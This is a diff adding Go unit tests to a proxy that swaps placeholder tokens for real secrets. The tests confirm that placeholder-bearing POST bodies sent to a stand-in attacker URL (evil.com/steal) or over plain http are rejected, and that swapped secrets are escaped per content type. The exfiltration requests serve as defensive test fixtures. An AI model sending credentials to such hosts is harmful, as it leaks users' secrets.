@@ -1551,3 +1551,100 @@ func TestLazy_FailureCachedAcrossRequests(t *testing.T) {
 	require.Equal(t, 1, fr.fetchCalls["MISSING"])
 }
 
+// bodyReq returns a POST to url whose buffered body has a known length.
+func bodyReq(url, contentType, body string) *http.Request {
+	req := httptest.NewRequest("POST", url, nil)
+	req.Body = transform.NewBufferedBody(io.NopCloser(strings.NewReader(body)), 1<<20)
+	req.ContentLength = int64(len(body))
+	if contentType != "" {
+		req.Header.Set("Content-Type", contentType)
+	}
+	return req
+}
+
+func TestSecrets_BodySentinelOutOfScopeRejected(t *testing.T) {
+	const ended = "asm_ended_body_sentinel_00000000"
+	cases := []struct {
+		name        string
+		url         string
+		contentType string
+		body        string
+		wantMsg     string
+		wantReason  string
+	}{
+		{"form body to other host", "https://evil.com/steal", "application/x-www-form-urlencoded",
+			"k=proxy-openai-abc123", msgSentinelNotValid, "sentinel_not_valid"},
+		{"json body to other host", "https://evil.com/steal", "application/json",
+			`{"k":"proxy-openai-abc123"}`, msgSentinelNotValid, "sentinel_not_valid"},
+		{"opaque body to other host", "https://evil.com/steal", "application/octet-stream",
+			"xxproxy-openai-abc123xx", msgSentinelNotValid, "sentinel_not_valid"},
+		{"body over plain http", "http://api.openai.com/v1/chat", "application/json",
+			`{"k":"proxy-openai-abc123"}`, msgSentinelNotValid, "sentinel_not_valid"},
+		{"ended sentinel in body to approved host", "https://api.openai.com/v1/chat", "application/json",
+			`{"k":"` + ended + `"}`, msgSentinelEnded, "sentinel_ended"},
+		{"ended sentinel in body to other host", "https://evil.com/steal", "text/plain",
+			ended, msgSentinelEnded, "sentinel_ended"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := makeSecrets(t, []secretEntry{
+				defaultEntry(),
+				{Replace: &replaceConfig{ProxyValue: ended, Ended: true}},
+			})
+			req := bodyReq(tc.url, tc.contentType, tc.body)
+			tctx := &transform.TransformContext{}
+			res, err := s.TransformRequest(context.Background(), tctx, req)
+			require.NoError(t, err)
+			require.Equal(t, transform.ActionReject, res.Action)
+			require.Equal(t, http.StatusForbidden, res.Response.StatusCode)
+			msg, err := io.ReadAll(res.Response.Body)
+			require.NoError(t, err)
+			require.Equal(t, tc.wantMsg+"\n", string(msg))
+			require.Equal(t, tc.wantReason, tctx.DrainAnnotations()["reject_reason"])
+
+			// The body is still readable for the proxy after the scan.
+			fwd, err := io.ReadAll(req.Body)
+			require.NoError(t, err)
+			require.Equal(t, tc.body, string(fwd))
+		})
+	}
+}
+
+func TestSecrets_BodySwapEscapesByContentType(t *testing.T) {
+	const real = `p&ss="x\y`
+	cases := []struct {
+		name        string
+		contentType string
+		body        string
+		want        string
+	}{
+		{"form", "application/x-www-form-urlencoded", "user=a&password=proxy-esc-token",
+			"user=a&password=p%26ss%3D%22x%5Cy"},
+		{"form with charset", "application/x-www-form-urlencoded; charset=utf-8", "password=proxy-esc-token",
+			"password=p%26ss%3D%22x%5Cy"},
+		{"json", "application/json", `{"password":"proxy-esc-token"}`,
+			`{"password":"p&ss=\"x\\y"}`},
+		{"json suffix", "application/vnd.api+json", `{"password":"proxy-esc-token"}`,
+			`{"password":"p&ss=\"x\\y"}`},
+		{"other", "text/plain", "password=proxy-esc-token",
+			`password=p&ss="x\y`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			reg := testRegistry()
+			reg["env"] = &fakeBuilder{secrets: map[string]string{"ESCAPE_ME": real}}
+			s, err := newFromConfig(secretsConfig{Secrets: []secretEntry{{
+				Source:  envSource("ESCAPE_ME"),
+				Rules:   []hostmatch.RuleConfig{{Host: "api.example.com"}},
+				Replace: &replaceConfig{ProxyValue: "proxy-esc-token", MatchBody: true},
+			}}}, reg)
+			require.NoError(t, err)
+
+			req := bodyReq("https://api.example.com/login", tc.contentType, tc.body)
+			doTransform(t, s, req)
+			got, err := io.ReadAll(req.Body)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, string(got))
+		})
+	}
+}
